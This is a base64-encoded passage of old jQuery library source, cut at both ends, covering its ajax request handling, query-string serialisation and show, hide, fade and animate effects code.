cm9zcyBkb21haW4gcmVxdWVzdHMgaW4gRmlyZWZveCAzCgkJdHJ5IHsKCQkJLy8gU2V0IHRoZSBjb3JyZWN0IGhlYWRlciwgaWYgZGF0YSBpcyBiZWluZyBzZW50CgkJCWlmICggcy5kYXRhICkKCQkJCXhtbC5zZXRSZXF1ZXN0SGVhZGVyKCJDb250ZW50LVR5cGUiLCBzLmNvbnRlbnRUeXBlKTsKCgkJCS8vIFNldCB0aGUgSWYtTW9kaWZpZWQtU2luY2UgaGVhZGVyLCBpZiBpZk1vZGlmaWVkIG1vZGUuCgkJCWlmICggcy5pZk1vZGlmaWVkICkKCQkJCXhtbC5zZXRSZXF1ZXN0SGVhZGVyKCJJZi1Nb2RpZmllZC1TaW5jZSIsCgkJCQkJalF1ZXJ5Lmxhc3RNb2RpZmllZFtzLnVybF0gfHwgIlRodSwgMDEgSmFuIDE5NzAgMDA6MDA6MDAgR01UIiApOwoKCQkJLy8gU2V0IGhlYWRlciBzbyB0aGUgY2FsbGVkIHNjcmlwdCBrbm93cyB0aGF0IGl0J3MgYW4gWE1MSHR0cFJlcXVlc3QKCQkJeG1sLnNldFJlcXVlc3RIZWFkZXIoIlgtUmVxdWVzdGVkLVdpdGgiLCAiWE1MSHR0cFJlcXVlc3QiKTsKCgkJCS8vIFNldCB0aGUgQWNjZXB0cyBoZWFkZXIgZm9yIHRoZSBzZXJ2ZXIsIGRlcGVuZGluZyBvbiB0aGUgZGF0YVR5cGUKCQkJeG1sLnNldFJlcXVlc3RIZWFkZXIoIkFjY2VwdCIsIHMuZGF0YVR5cGUgJiYgcy5hY2NlcHRzWyBzLmRhdGFUeXBlIF0gPwoJCQkJcy5hY2NlcHRzWyBzLmRhdGFUeXBlIF0gKyAiLCAqLyoiIDoKCQkJCXMuYWNjZXB0cy5fZGVmYXVsdCApOwoJCX0gY2F0Y2goZSl7fQoKCQkvLyBBbGxvdyBjdXN0b20gaGVhZGVycy9taW1ldHlwZXMKCQlpZiAoIHMuYmVmb3JlU2VuZCApCgkJCXMuYmVmb3JlU2VuZCh4bWwpOwoJCQkKCQlpZiAoIHMuZ2xvYmFsICkKCQkJalF1ZXJ5LmV2ZW50LnRyaWdnZXIoImFqYXhTZW5kIiwgW3htbCwgc10pOwoKCQkvLyBXYWl0IGZvciBhIHJlc3BvbnNlIHRvIGNvbWUgYmFjawoJCXZhciBvbnJlYWR5c3RhdGVjaGFuZ2UgPSBmdW5jdGlvbihpc1RpbWVvdXQpewoJCQkvLyBUaGUgdHJhbnNmZXIgaXMgY29tcGxldGUgYW5kIHRoZSBkYXRhIGlzIGF2YWlsYWJsZSwgb3IgdGhlIHJlcXVlc3QgdGltZWQgb3V0CgkJCWlmICggIXJlcXVlc3REb25lICYmIHhtbCAmJiAoeG1sLnJlYWR5U3RhdGUgPT0gNCB8fCBpc1RpbWVvdXQgPT0gInRpbWVvdXQiKSApIHsKCQkJCXJlcXVlc3REb25lID0gdHJ1ZTsKCQkJCQoJCQkJLy8gY2xlYXIgcG9sbCBpbnRlcnZhbAoJCQkJaWYgKGl2YWwpIHsKCQkJCQljbGVhckludGVydmFsKGl2YWwpOwoJCQkJCWl2YWwgPSBudWxsOwoJCQkJfQoJCQkJCgkJCQlzdGF0dXMgPSBpc1RpbWVvdXQgPT0gInRpbWVvdXQiICYmICJ0aW1lb3V0IiB8fAoJCQkJCSFqUXVlcnkuaHR0cFN1Y2Nlc3MoIHhtbCApICYmICJlcnJvciIgfHwKCQkJCQlzLmlmTW9kaWZpZWQgJiYgalF1ZXJ5Lmh0dHBOb3RNb2RpZmllZCggeG1sLCBzLnVybCApICYmICJub3Rtb2RpZmllZCIgfHwKCQkJCQkic3VjY2VzcyI7CgoJCQkJaWYgKCBzdGF0dXMgPT0gInN1Y2Nlc3MiICkgewoJCQkJCS8vIFdhdGNoIGZvciwgYW5kIGNhdGNoLCBYTUwgZG9jdW1lbnQgcGFyc2UgZXJyb3JzCgkJCQkJdHJ5IHsKCQkJCQkJLy8gcHJvY2VzcyB0aGUgZGF0YSAocnVucyB0aGUgeG1sIHRocm91Z2ggaHR0cERhdGEgcmVnYXJkbGVzcyBvZiBjYWxsYmFjaykKCQkJCQkJZGF0YSA9IGpRdWVyeS5odHRwRGF0YSggeG1sLCBzLmRhdGFUeXBlICk7CgkJCQkJfSBjYXRjaChlKSB7CgkJCQkJCXN0YXR1cyA9ICJwYXJzZXJlcnJvciI7CgkJCQkJfQoJCQkJfQoKCQkJCS8vIE1ha2Ugc3VyZSB0aGF0IHRoZSByZXF1ZXN0IHdhcyBzdWNjZXNzZnVsIG9yIG5vdG1vZGlmaWVkCgkJCQlpZiAoIHN0YXR1cyA9PSAic3VjY2VzcyIgKSB7CgkJCQkJLy8gQ2FjaGUgTGFzdC1Nb2RpZmllZCBoZWFkZXIsIGlmIGlmTW9kaWZpZWQgbW9kZS4KCQkJCQl2YXIgbW9kUmVzOwoJCQkJCXRyeSB7CgkJCQkJCW1vZFJlcyA9IHhtbC5nZXRSZXNwb25zZUhlYWRlcigiTGFzdC1Nb2RpZmllZCIpOwoJCQkJCX0gY2F0Y2goZSkge30gLy8gc3dhbGxvdyBleGNlcHRpb24gdGhyb3duIGJ5IEZGIGlmIGhlYWRlciBpcyBub3QgYXZhaWxhYmxlCgkKCQkJCQlpZiAoIHMuaWZNb2RpZmllZCAmJiBtb2RSZXMgKQoJCQkJCQlqUXVlcnkubGFzdE1vZGlmaWVkW3MudXJsXSA9IG1vZFJlczsKCgkJCQkJLy8gSlNPTlAgaGFuZGxlcyBpdHMgb3duIHN1Y2Nlc3MgY2FsbGJhY2sKCQkJCQlpZiAoICFqc29ucCApCgkJCQkJCXN1Y2Nlc3MoKTsJCgkJCQl9IGVsc2UKCQkJCQlqUXVlcnkuaGFuZGxlRXJyb3IocywgeG1sLCBzdGF0dXMpOwoKCQkJCS8vIEZpcmUgdGhlIGNvbXBsZXRlIGhhbmRsZXJzCgkJCQljb21wbGV0ZSgpOwoKCQkJCS8vIFN0b3AgbWVtb3J5IGxlYWtzCgkJCQlpZiAoIHMuYXN5bmMgKQoJCQkJCXhtbCA9IG51bGw7CgkJCX0KCQl9OwoJCQoJCWlmICggcy5hc3luYyApIHsKCQkJLy8gZG9uJ3QgYXR0YWNoIHRoZSBoYW5kbGVyIHRvIHRoZSByZXF1ZXN0LCBqdXN0IHBvbGwgaXQgaW5zdGVhZAoJCQl2YXIgaXZhbCA9IHNldEludGVydmFsKG9ucmVhZHlzdGF0ZWNoYW5nZSwgMTMpOyAKCgkJCS8vIFRpbWVvdXQgY2hlY2tlcgoJCQlpZiAoIHMudGltZW91dCA+IDAgKQoJCQkJc2V0VGltZW91dChmdW5jdGlvbigpewoJCQkJCS8vIENoZWNrIHRvIHNlZSBpZiB0aGUgcmVxdWVzdCBpcyBzdGlsbCBoYXBwZW5pbmcKCQkJCQlpZiAoIHhtbCApIHsKCQkJCQkJLy8gQ2FuY2VsIHRoZSByZXF1ZXN0CgkJCQkJCXhtbC5hYm9ydCgpOwoJCgkJCQkJCWlmKCAhcmVxdWVzdERvbmUgKQoJCQkJCQkJb25yZWFkeXN0YXRlY2hhbmdlKCAidGltZW91dCIgKTsKCQkJCQl9CgkJCQl9LCBzLnRpbWVvdXQpOwoJCX0KCQkJCgkJLy8gU2VuZCB0aGUgZGF0YQoJCXRyeSB7CgkJCXhtbC5zZW5kKHMuZGF0YSk7CgkJfSBjYXRjaChlKSB7CgkJCWpRdWVyeS5oYW5kbGVFcnJvcihzLCB4bWwsIG51bGwsIGUpOwoJCX0KCQkKCQkvLyBmaXJlZm94IDEuNSBkb2Vzbid0IGZpcmUgc3RhdGVjaGFuZ2UgZm9yIHN5bmMgcmVxdWVzdHMKCQlpZiAoICFzLmFzeW5jICkKCQkJb25yZWFkeXN0YXRlY2hhbmdlKCk7CgoJCWZ1bmN0aW9uIHN1Y2Nlc3MoKXsKCQkJLy8gSWYgYSBsb2NhbCBjYWxsYmFjayB3YXMgc3BlY2lmaWVkLCBmaXJlIGl0IGFuZCBwYXNzIGl0IHRoZSBkYXRhCgkJCWlmICggcy5zdWNjZXNzICkKCQkJCXMuc3VjY2VzcyggZGF0YSwgc3RhdHVzICk7CgoJCQkvLyBGaXJlIHRoZSBnbG9iYWwgY2FsbGJhY2sKCQkJaWYgKCBzLmdsb2JhbCApCgkJCQlqUXVlcnkuZXZlbnQudHJpZ2dlciggImFqYXhTdWNjZXNzIiwgW3htbCwgc10gKTsKCQl9CgoJCWZ1bmN0aW9uIGNvbXBsZXRlKCl7CgkJCS8vIFByb2Nlc3MgcmVzdWx0CgkJCWlmICggcy5jb21wbGV0ZSApCgkJCQlzLmNvbXBsZXRlKHhtbCwgc3RhdHVzKTsKCgkJCS8vIFRoZSByZXF1ZXN0IHdhcyBjb21wbGV0ZWQKCQkJaWYgKCBzLmdsb2JhbCApCgkJCQlqUXVlcnkuZXZlbnQudHJpZ2dlciggImFqYXhDb21wbGV0ZSIsIFt4bWwsIHNdICk7CgoJCQkvLyBIYW5kbGUgdGhlIGdsb2JhbCBBSkFYIGNvdW50ZXIKCQkJaWYgKCBzLmdsb2JhbCAmJiAhIC0talF1ZXJ5LmFjdGl2ZSApCgkJCQlqUXVlcnkuZXZlbnQudHJpZ2dlciggImFqYXhTdG9wIiApOwoJCX0KCQkKCQkvLyByZXR1cm4gWE1MSHR0cFJlcXVlc3QgdG8gYWxsb3cgYWJvcnRpbmcgdGhlIHJlcXVlc3QgZXRjLgoJCXJldHVybiB4bWw7Cgl9LAoKCWhhbmRsZUVycm9yOiBmdW5jdGlvbiggcywgeG1sLCBzdGF0dXMsIGUgKSB7CgkJLy8gSWYgYSBsb2NhbCBjYWxsYmFjayB3YXMgc3BlY2lmaWVkLCBmaXJlIGl0CgkJaWYgKCBzLmVycm9yICkgcy5lcnJvciggeG1sLCBzdGF0dXMsIGUgKTsKCgkJLy8gRmlyZSB0aGUgZ2xvYmFsIGNhbGxiYWNrCgkJaWYgKCBzLmdsb2JhbCApCgkJCWpRdWVyeS5ldmVudC50cmlnZ2VyKCAiYWpheEVycm9yIiwgW3htbCwgcywgZV0gKTsKCX0sCgoJLy8gQ291bnRlciBmb3IgaG9sZGluZyB0aGUgbnVtYmVyIG9mIGFjdGl2ZSBxdWVyaWVzCglhY3RpdmU6IDAsCgoJLy8gRGV0ZXJtaW5lcyBpZiBhbiBYTUxIdHRwUmVxdWVzdCB3YXMgc3VjY2Vzc2Z1bCBvciBub3QKCWh0dHBTdWNjZXNzOiBmdW5jdGlvbiggciApIHsKCQl0cnkgewoJCQkvLyBJRSBlcnJvciBzb21ldGltZXMgcmV0dXJucyAxMjIzIHdoZW4gaXQgc2hvdWxkIGJlIDIwNCBzbyB0cmVhdCBpdCBhcyBzdWNjZXNzLCBzZWUgIzE0NTAKCQkJcmV0dXJuICFyLnN0YXR1cyAmJiBsb2NhdGlvbi5wcm90b2NvbCA9PSAiZmlsZToiIHx8CgkJCQkoIHIuc3RhdHVzID49IDIwMCAmJiByLnN0YXR1cyA8IDMwMCApIHx8IHIuc3RhdHVzID09IDMwNCB8fCByLnN0YXR1cyA9PSAxMjIzIHx8CgkJCQlqUXVlcnkuYnJvd3Nlci5zYWZhcmkgJiYgci5zdGF0dXMgPT0gdW5kZWZpbmVkOwoJCX0gY2F0Y2goZSl7fQoJCXJldHVybiBmYWxzZTsKCX0sCgoJLy8gRGV0ZXJtaW5lcyBpZiBhbiBYTUxIdHRwUmVxdWVzdCByZXR1cm5zIE5vdE1vZGlmaWVkCglodHRwTm90TW9kaWZpZWQ6IGZ1bmN0aW9uKCB4bWwsIHVybCApIHsKCQl0cnkgewoJCQl2YXIgeG1sUmVzID0geG1sLmdldFJlc3BvbnNlSGVhZGVyKCJMYXN0LU1vZGlmaWVkIik7CgoJCQkvLyBGaXJlZm94IGFsd2F5cyByZXR1cm5zIDIwMC4gY2hlY2sgTGFzdC1Nb2RpZmllZCBkYXRlCgkJCXJldHVybiB4bWwuc3RhdHVzID09IDMwNCB8fCB4bWxSZXMgPT0galF1ZXJ5Lmxhc3RNb2RpZmllZFt1cmxdIHx8CgkJCQlqUXVlcnkuYnJvd3Nlci5zYWZhcmkgJiYgeG1sLnN0YXR1cyA9PSB1bmRlZmluZWQ7CgkJfSBjYXRjaChlKXt9CgkJcmV0dXJuIGZhbHNlOwoJfSwKCglodHRwRGF0YTogZnVuY3Rpb24oIHIsIHR5cGUgKSB7CgkJdmFyIGN0ID0gci5nZXRSZXNwb25zZUhlYWRlcigiY29udGVudC10eXBlIik7CgkJdmFyIHhtbCA9IHR5cGUgPT0gInhtbCIgfHwgIXR5cGUgJiYgY3QgJiYgY3QuaW5kZXhPZigieG1sIikgPj0gMDsKCQl2YXIgZGF0YSA9IHhtbCA/IHIucmVzcG9uc2VYTUwgOiByLnJlc3BvbnNlVGV4dDsKCgkJaWYgKCB4bWwgJiYgZGF0YS5kb2N1bWVudEVsZW1lbnQudGFnTmFtZSA9PSAicGFyc2VyZXJyb3IiICkKCQkJdGhyb3cgInBhcnNlcmVycm9yIjsKCgkJLy8gSWYgdGhlIHR5cGUgaXMgInNjcmlwdCIsIGV2YWwgaXQgaW4gZ2xvYmFsIGNvbnRleHQKCQlpZiAoIHR5cGUgPT0gInNjcmlwdCIgKQoJCQlqUXVlcnkuZ2xvYmFsRXZhbCggZGF0YSApOwoKCQkvLyBHZXQgdGhlIEphdmFTY3JpcHQgb2JqZWN0LCBpZiBKU09OIGlzIHVzZWQuCgkJaWYgKCB0eXBlID09ICJqc29uIiApCgkJCWRhdGEgPSBldmFsKCIoIiArIGRhdGEgKyAiKSIpOwoKCQlyZXR1cm4gZGF0YTsKCX0sCgoJLy8gU2VyaWFsaXplIGFuIGFycmF5IG9mIGZvcm0gZWxlbWVudHMgb3IgYSBzZXQgb2YKCS8vIGtleS92YWx1ZXMgaW50byBhIHF1ZXJ5IHN0cmluZwoJcGFyYW06IGZ1bmN0aW9uKCBhICkgewoJCXZhciBzID0gW107CgoJCS8vIElmIGFuIGFycmF5IHdhcyBwYXNzZWQgaW4sIGFzc3VtZSB0aGF0IGl0IGlzIGFuIGFycmF5CgkJLy8gb2YgZm9ybSBlbGVtZW50cwoJCWlmICggYS5jb25zdHJ1Y3RvciA9PSBBcnJheSB8fCBhLmpxdWVyeSApCgkJCS8vIFNlcmlhbGl6ZSB0aGUgZm9ybSBlbGVtZW50cwoJCQlqUXVlcnkuZWFjaCggYSwgZnVuY3Rpb24oKXsKCQkJCXMucHVzaCggZW5jb2RlVVJJQ29tcG9uZW50KHRoaXMubmFtZSkgKyAiPSIgKyBlbmNvZGVVUklDb21wb25lbnQoIHRoaXMudmFsdWUgKSApOwoJCQl9KTsKCgkJLy8gT3RoZXJ3aXNlLCBhc3N1bWUgdGhhdCBpdCdzIGFuIG9iamVjdCBvZiBrZXkvdmFsdWUgcGFpcnMKCQllbHNlCgkJCS8vIFNlcmlhbGl6ZSB0aGUga2V5L3ZhbHVlcwoJCQlmb3IgKCB2YXIgaiBpbiBhICkKCQkJCS8vIElmIHRoZSB2YWx1ZSBpcyBhbiBhcnJheSB0aGVuIHRoZSBrZXkgbmFtZXMgbmVlZCB0byBiZSByZXBlYXRlZAoJCQkJaWYgKCBhW2pdICYmIGFbal0uY29uc3RydWN0b3IgPT0gQXJyYXkgKQoJCQkJCWpRdWVyeS5lYWNoKCBhW2pdLCBmdW5jdGlvbigpewoJCQkJCQlzLnB1c2goIGVuY29kZVVSSUNvbXBvbmVudChqKSArICI9IiArIGVuY29kZVVSSUNvbXBvbmVudCggdGhpcyApICk7CgkJCQkJfSk7CgkJCQllbHNlCgkJCQkJcy5wdXNoKCBlbmNvZGVVUklDb21wb25lbnQoaikgKyAiPSIgKyBlbmNvZGVVUklDb21wb25lbnQoIGFbal0gKSApOwoKCQkvLyBSZXR1cm4gdGhlIHJlc3VsdGluZyBzZXJpYWxpemF0aW9uCgkJcmV0dXJuIHMuam9pbigiJiIpLnJlcGxhY2UoLyUyMC9nLCAiKyIpOwoJfQoKfSk7CmpRdWVyeS5mbi5leHRlbmQoewoJc2hvdzogZnVuY3Rpb24oc3BlZWQsY2FsbGJhY2spewoJCXJldHVybiBzcGVlZCA/CgkJCXRoaXMuYW5pbWF0ZSh7CgkJCQloZWlnaHQ6ICJzaG93Iiwgd2lkdGg6ICJzaG93Iiwgb3BhY2l0eTogInNob3ciCgkJCX0sIHNwZWVkLCBjYWxsYmFjaykgOgoJCQkKCQkJdGhpcy5maWx0ZXIoIjpoaWRkZW4iKS5lYWNoKGZ1bmN0aW9uKCl7CgkJCQl0aGlzLnN0eWxlLmRpc3BsYXkgPSB0aGlzLm9sZGJsb2NrIHx8ICIiOwoJCQkJaWYgKCBqUXVlcnkuY3NzKHRoaXMsImRpc3BsYXkiKSA9PSAibm9uZSIgKSB7CgkJCQkJdmFyIGVsZW0gPSBqUXVlcnkoIjwiICsgdGhpcy50YWdOYW1lICsgIiAvPiIpLmFwcGVuZFRvKCJib2R5Iik7CgkJCQkJdGhpcy5zdHlsZS5kaXNwbGF5ID0gZWxlbS5jc3MoImRpc3BsYXkiKTsKCQkJCQkvLyBoYW5kbGUgYW4gZWRnZSBjb25kaXRpb24gd2hlcmUgY3NzIGlzIC0gZGl2IHsgZGlzcGxheTpub25lOyB9IG9yIHNpbWlsYXIKCQkJCQlpZiAodGhpcy5zdHlsZS5kaXNwbGF5ID09ICJub25lIikKCQkJCQkJdGhpcy5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsKCQkJCQllbGVtLnJlbW92ZSgpOwoJCQkJfQoJCQl9KS5lbmQoKTsKCX0sCgkKCWhpZGU6IGZ1bmN0aW9uKHNwZWVkLGNhbGxiYWNrKXsKCQlyZXR1cm4gc3BlZWQgPwoJCQl0aGlzLmFuaW1hdGUoewoJCQkJaGVpZ2h0OiAiaGlkZSIsIHdpZHRoOiAiaGlkZSIsIG9wYWNpdHk6ICJoaWRlIgoJCQl9LCBzcGVlZCwgY2FsbGJhY2spIDoKCQkJCgkJCXRoaXMuZmlsdGVyKCI6dmlzaWJsZSIpLmVhY2goZnVuY3Rpb24oKXsKCQkJCXRoaXMub2xkYmxvY2sgPSB0aGlzLm9sZGJsb2NrIHx8IGpRdWVyeS5jc3ModGhpcywiZGlzcGxheSIpOwoJCQkJdGhpcy5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwoJCQl9KS5lbmQoKTsKCX0sCgoJLy8gU2F2ZSB0aGUgb2xkIHRvZ2dsZSBmdW5jdGlvbgoJX3RvZ2dsZTogalF1ZXJ5LmZuLnRvZ2dsZSwKCQoJdG9nZ2xlOiBmdW5jdGlvbiggZm4sIGZuMiApewoJCXJldHVybiBqUXVlcnkuaXNGdW5jdGlvbihmbikgJiYgalF1ZXJ5LmlzRnVuY3Rpb24oZm4yKSA/CgkJCXRoaXMuX3RvZ2dsZSggZm4sIGZuMiApIDoKCQkJZm4gPwoJCQkJdGhpcy5hbmltYXRlKHsKCQkJCQloZWlnaHQ6ICJ0b2dnbGUiLCB3aWR0aDogInRvZ2dsZSIsIG9wYWNpdHk6ICJ0b2dnbGUiCgkJCQl9LCBmbiwgZm4yKSA6CgkJCQl0aGlzLmVhY2goZnVuY3Rpb24oKXsKCQkJCQlqUXVlcnkodGhpcylbIGpRdWVyeSh0aGlzKS5pcygiOmhpZGRlbiIpID8gInNob3ciIDogImhpZGUiIF0oKTsKCQkJCX0pOwoJfSwKCQoJc2xpZGVEb3duOiBmdW5jdGlvbihzcGVlZCxjYWxsYmFjayl7CgkJcmV0dXJuIHRoaXMuYW5pbWF0ZSh7aGVpZ2h0OiAic2hvdyJ9LCBzcGVlZCwgY2FsbGJhY2spOwoJfSwKCQoJc2xpZGVVcDogZnVuY3Rpb24oc3BlZWQsY2FsbGJhY2spewoJCXJldHVybiB0aGlzLmFuaW1hdGUoe2hlaWdodDogImhpZGUifSwgc3BlZWQsIGNhbGxiYWNrKTsKCX0sCgoJc2xpZGVUb2dnbGU6IGZ1bmN0aW9uKHNwZWVkLCBjYWxsYmFjayl7CgkJcmV0dXJuIHRoaXMuYW5pbWF0ZSh7aGVpZ2h0OiAidG9nZ2xlIn0sIHNwZWVkLCBjYWxsYmFjayk7Cgl9LAoJCglmYWRlSW46IGZ1bmN0aW9uKHNwZWVkLCBjYWxsYmFjayl7CgkJcmV0dXJuIHRoaXMuYW5pbWF0ZSh7b3BhY2l0eTogInNob3cifSwgc3BlZWQsIGNhbGxiYWNrKTsKCX0sCgkKCWZhZGVPdXQ6IGZ1bmN0aW9uKHNwZWVkLCBjYWxsYmFjayl7CgkJcmV0dXJuIHRoaXMuYW5pbWF0ZSh7b3BhY2l0eTogImhpZGUifSwgc3BlZWQsIGNhbGxiYWNrKTsKCX0sCgkKCWZhZGVUbzogZnVuY3Rpb24oc3BlZWQsdG8sY2FsbGJhY2spewoJCXJldHVybiB0aGlzLmFuaW1hdGUoe29wYWNpdHk6IHRvfSwgc3BlZWQsIGNhbGxiYWNrKTsKCX0sCgkKCWFuaW1hdGU6IGZ1bmN0aW9uKCBwcm9wLCBzcGVlZCwgZWFzaW5nLCBjYWxsYmFjayApIHsKCQl2YXIgb3B0YWxsID0galF1ZXJ5LnNwZWVkKHNwZWVkLCBlYXNpbmcsIGNhbGxiYWNrKTsKCgkJcmV0dXJuIHRoaXNbIG9wdGFsbC5xdWV1ZSA9PT0gZmFsc2UgPyAiZWFjaCIgOiAicXVldWUiIF0oZnVuY3Rpb24oKXsKCQkJaWYgKCB0aGlzLm5vZGVUeXBlICE9IDEpCgkJCQlyZXR1cm4gZmFsc2U7CgoJCQl2YXIgb3B0ID0galF1ZXJ5LmV4dGVuZCh7fSwgb3B0YWxsKTsKCQkJdmFyIGhpZGRlbiA9IGpRdWVyeSh0aGlzKS5pcygiOmhpZGRlbiIpLCBzZWxmID0gdGhpczsKCQkJCgkJCWZvciAoIHZhciBwIGluIHByb3AgKSB7CgkJCQlpZiAoIHByb3BbcF0gPT0gImhpZGUiICYmIGhpZGRlbiB8fCBwcm9wW3BdID09ICJzaG93IiAmJiAhaGlkZGVuICkKCQkJCQlyZXR1cm4galF1ZXJ5LmlzRnVuY3Rpb24ob3B0LmNvbXBsZXRlKSAmJiBvcHQuY29tcGxldGUuYXBwbHkodGhpcyk7CgoJCQkJaWYgKCBwID09ICJoZWlnaHQiIHx8IHAgPT0gIndpZHRoIiApIHsKCQkJCQkvLyBTdG9yZSBkaXNwbGF5IHByb3BlcnR5CgkJCQkJb3B0LmRpc3BsYXkgPSBqUXVlcnkuY3NzKHRoaXMsICJkaXNwbGF5Iik7CgoJCQkJCS8vIE1ha2Ugc3VyZSB0aGF0IG5vdGhpbmcgc25lYWtzIG91dAoJCQkJCW9wdC5vdmVyZmxvdyA9IHRoaXMuc3R5bGUub3ZlcmZsb3c7CgkJCQl9CgkJCX0KCgkJCWlmICggb3B0Lm92ZXJmbG93ICE9IG51bGwgKQoJCQkJdGhpcy5zdHlsZS5vdmVyZmxvdyA9ICJoaWRkZW4iOwoKCQkJb3B0LmN1ckFuaW0gPSBqUXVlcnkuZXh0ZW5kKHt9LCBwcm9wKTsKCQkJCgkJCWpRdWVyeS5lYWNoKCBwcm9wLCBmdW5jdGlvbihuYW1lLCB2YWwpewoJCQkJdmFyIGUgPSBuZXcgalF1ZXJ5LmZ4KCBzZWxmLCBvcHQsIG5hbWUgKTsKCgkJCQlpZiAoIC90b2dnbGV8c2hvd3xoaWRlLy50ZXN0KHZhbCkgKQoJCQkJCWVbIHZhbCA9PSAidG9nZ2xlIiA/IGhpZGRlbiA/ICJzaG93IiA6ICJoaWRlIiA6IHZhbCBdKCBwcm9wICk7CgkJCQllbHNlIHsKCQkJCQl2YXIgcGFydHMgPSB2YWwudG9TdHJpbmcoKS5tYXRjaCgvXihbKy1dPSk/KFtcZCstLl0rKSguKikkLyksCgkJCQkJCXN0YXJ0ID0gZS5jdXIodHJ1ZSkgfHwgMDsKCgkJCQkJaWYgKCBwYXJ0cyApIHsKCQkJCQkJdmFyIGVuZCA9IHBhcnNlRmxvYXQocGFydHNbMl0pLAoJCQkJCQkJdW5pdCA9IHBhcnRzWzNdIHx8ICJweCI7CgoJCQkJCQkvLyBXZSBuZWVkIHRvIGNvbXB1dGUgc3RhcnRpbmcgdmFsdWUKCQkJCQkJaWYgKCB1bml0ICE9ICJweCIgKSB7CgkJCQkJCQlzZWxmLnN0eWxlWyBuYW1lIF0gPSAoZW5kIHx8IDEpICsgdW5pdDsKCQkJCQkJCXN0YXJ0ID0gKChlbmQgfHwgMSkgLyBlLmN1cih0cnVlKSkgKiBzdGFydDsKCQkJCQkJCXNlbGYuc3R5bGVbIG5hbWUgXSA9IHN0YXJ0ICsgdW5pdDsKCQkJCQkJfQoKCQkJCQkJLy8gSWYgYSArPS8tPSB0b2tlbiB3YXMgcHJvdmlkZWQsIHdlJ3JlIGRvaW5nIGEgcmVsYXRpdmUgYW5pbWF0aW9uCgkJCQkJCWlmICggcGFydHNbMV0gKQoJCQkJCQkJZW5kID0gKChwYXJ0c1sxXSA9PSAiLT0iID8gLTEgOiAxKSAqIGVuZCkgKyBzdGFydDsKCgkJCQkJCWUuY3VzdG9tKCBzdGFydCwgZW5kLCB1bml0ICk7CgkJCQkJfSBlbHNlCgkJCQkJCWUuY3VzdG9tKCBzdGFydCwgdmFsLCAiIiApOwoJCQkJfQoJCQl9KTsKCgkJCS8vIEZvciBKUyBzdHJpY3QgY29tcGxpYW5jZQoJCQlyZXR1cm4gdHJ1ZTsKCQl9KTsKCX0sCgkKCXF1ZXVlOiBmdW5jdGlvbih0eXBlLCBmbil7CgkJaWYgKCBqUXVlcnkuaXNGdW5jdGlvbih0eXBlKSB8fCAoIHR5cGUgJiYgdHlwZS5jb25zdHJ1Y3RvciA9PSBBcnJheSApKSB7CgkJCWZuID0gdHlwZTsKCQkJdHlwZSA9ICJmeCI7CgkJfQoKCQlpZiAoICF0eXBlIHx8ICh0eXBlb2YgdHlwZSA9PSAic3RyaW5nIiAmJiAhZm4pICkKCQkJcmV0dXJuIHF1ZXVlKCB0aGlzWzBdLCB0eXBlICk7CgoJCXJldHVybiB0aGlzLmVhY2goZnVuY3Rpb24oKXsKCQkJaWYgKCBmbi5jb25zdHJ1Y3RvciA9PSBBcnJheSApCgkJCQlxdWV1ZSh0aGlzLCB0eXBlLCBmbik7CgkJCWVsc2UgewoJCQkJcXVldWUodGhpcywgdHlwZSkucHVzaCggZm4gKTsKCQkJCgkJCQlpZiAoIHF1ZXVlKHRoaXMsIHR5cGUpLmxlbmd0aCA9PSAxICkKCQkJCQlmbi5hcHBseSh0aGlzKTsKCQkJfQoJCX0pOwoJfSwKCglzdG9wOiBmdW5jdGlvbihjbGVhclF1ZXVlLCBnb3RvRW5kKXsKCQl2YXIgdGltZXJzID0galF1ZXJ5LnRpbWVyczsKCgkJaWYgKGNsZWFyUXVldWUpCgkJCXRoaXMucXVldWUoW10pOwoKCQl0aGlzLmVhY2goZnVuY3Rpb24oKXsKCQkJLy8gZ28gaW4gcmV2ZXJzZSBvcmRlciBzbyBhbnl0aGluZyBhZGRlZCB0byB0aGUgcXVldWUgZHVyaW5nIHRoZSBsb29wIGlzIGlnbm9yZWQKCQkJZm9yICggdmFyIGkgPSB0aW1lcnMubGVuZ3RoIC0gMTsgaSA+PSAwOyBpLS0gKQoJCQkJaWYgKCB0aW1lcnNbaV0uZWxlbSA9PSB0aGlzICkgewoJCQkJCWlmIChnb3RvRW5kKQoJCQkJCQkvLyBmb3JjZSB0aGUgbmV4dCBzdGVwIHRvIGJlIHRoZSBsYXN0CgkJCQkJCXRpbWVyc1tpXSh0cnVlKTsKCQkJCQl0aW1lcnMuc3BsaWNlKGksIDEpOwoJCQkJfQoJCX0pOwoKCQkvLyBzdGFydCB0aGUgbmV4dCBpbiB0aGUgcXVldWUgaWYgdGhlIGxhc3Qgc3RlcCB3YXNuJ3QgZm9yY2VkCgkJaWYgKCFnb3RvRW5kKQoJCQl0aGlzLmRlcXVldWUoKTsKCgkJcmV0dXJuIHRoaXM7Cgl9Cgp9KTsKCnZhciBxdWV1ZSA9IGZ1bmN0aW9uKCBlbGVtLCB0eXBlLCBhcnJheSApIHsKCWlmICggIWVsZW0gKQoJCXJldHVybiB1bmRlZmluZWQ7CgoJdHlwZSA9IHR5cGUgfHwgImZ4IjsKCgl2YXIgcSA9IGpRdWVyeS5kYXRhKCBlbGVtLCB0eXBlICsgInF1ZXVlIiApOwoKCWlmICggIXEgfHwgYXJyYXkgKQoJCXEgPSBqUXVlcnkuZGF0YSggZWxlbSwgdHlwZSArICJxdWV1ZSIsIAoJCQlhcnJheSA/IGpRdWVyeS5tYWtlQXJyYXkoYXJyYXkpIDogW10gKTsKCglyZXR1cm4gcTsKfTsKCmpRdWVyeS5mbi5kZXF1ZXVlID0gZnVuY3Rpb24odHlwZSl7Cgl0eXBlID0gdHlwZSB8fCAiZngiOwoKCXJldHVybiB0aGlzLmVhY2goZnVuY3Rpb24oKXsKCQl2YXIgcSA9IHF1ZXVlKHRoaXMsIHR5cGUpOwoKCQlxLnNoaWZ0KCk7CgoJCWlmICggcS5sZW5ndGggKQoJCQlxWzBdLmFwcGx5KCB0aGlzICk7Cgl9KTsKfTsKCmpRdWVyeS5leHRlbmQoewoJCglzcGVlZDogZnVuY3Rpb24oc3BlZWQsIGVhc2luZywgZm4pIHsKCQl2YXIgb3B0ID0gc3BlZWQgJiYgc3BlZWQuY29uc3RydWN0b3IgPT0gT2JqZWN0ID8gc3BlZWQgOiB7CgkJCWNvbXBsZXRlOiBmbiB8fCAhZm4gJiYgZWFzaW5nIHx8IAoJCQkJalF1ZXJ5LmlzRnVuY3Rpb